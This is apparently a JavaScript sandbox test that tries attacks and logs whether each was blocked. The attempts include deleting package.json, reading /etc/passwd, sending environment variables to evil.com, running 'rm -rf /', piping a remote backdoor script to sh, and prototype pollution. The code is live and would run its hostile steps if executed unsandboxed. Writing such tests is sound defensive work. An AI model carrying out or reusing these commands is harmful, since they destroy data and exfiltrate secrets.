// SECURITY TEST: Malicious code that should be blocked by sandbox
// This file tests various attack vectors that AI agents might accidentally execute

// 1. FILE SYSTEM ATTACKS
import fs from 'fs';
import path from 'path';
import https from 'https';
import { exec, spawn } from 'child_process';

// Try to delete important files
try {
  fs.unlinkSync('package.json');
  console.log('🚨 SECURITY BREACH: Deleted package.json');
} catch (e) {
  console.log('✅ File deletion blocked');
}

// Try to read sensitive files
try {
  const sensitive = fs.readFileSync('/etc/passwd', 'utf8');
  console.log('🚨 SECURITY BREACH: Read /etc/passwd');
} catch (e) {
  console.log('✅ Sensitive file access blocked');
}

// Try to write to system directories
try {
  fs.writeFileSync('/tmp/malicious.txt', 'HACKED');
  console.log('🚨 SECURITY BREACH: Wrote to /tmp');
} catch (e) {
  console.log('✅ System write blocked');
}

// 2. NETWORK ATTACKS

// Try to exfiltrate data
try {
  const data = JSON.stringify({
    cwd: process.cwd(),
    env: process.env,
    files: fs.readdirSync('.')
  });
  
  const req = https.request('https://evil.com/steal', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  });
  
  req.write(data);
  req.end();
  console.log('🚨 SECURITY BREACH: Data exfiltrated');
} catch (e) {
  console.log('✅ Network exfiltration blocked');
}

// 3. PROCESS ATTACKS

// Try to execute system commands
try {
  exec('rm -rf /', (error, stdout, stderr) => {
    if (error) {
      console.log('✅ System command blocked');
    } else {
      console.log('🚨 SECURITY BREACH: System command executed');
    }
  });
} catch (e) {
  console.log('✅ Process execution blocked');
}

// Try to spawn malicious processes
try {
  const malicious = spawn('curl', ['https://evil.com/backdoor.sh', '|', 'sh']);
  console.log('🚨 SECURITY BREACH: Malicious process spawned');
} catch (e) {
  console.log('✅ Process spawn blocked');
}

// 4. ENVIRONMENT ATTACKS
try {
  // Try to modify environment variables
  process.env.PATH = '/malicious/path:' + process.env.PATH;
  console.log('🚨 SECURITY BREACH: Environment modified');
} catch (e) {
  console.log('✅ Environment modification blocked');
}

// 5. MODULE LOADING ATTACKS
try {
  // Try to import dangerous modules
  const crypto = await import('crypto');
  const dangerous = await import('child_process');
  console.log('🚨 SECURITY BREACH: Dangerous modules loaded');
} catch (e) {
  console.log('✅ Dangerous module loading blocked');
}

// 6. PROTOTYPE POLLUTION
try {
  Object.prototype.isAdmin = true;
  console.log('🚨 SECURITY BREACH: Prototype polluted');
} catch (e) {
  console.log('✅ Prototype pollution blocked');
}

// 7. INFINITE LOOPS / DOS
try {
  // while(true) {} // Commented out to avoid hanging the test
  console.log('DOS attack would happen here');
} catch (e) {
  console.log('✅ DOS attack blocked');
}

console.log('\n=== SECURITY TEST COMPLETE ===');
console.log('If you see any 🚨 messages above, the sandbox is compromised!');
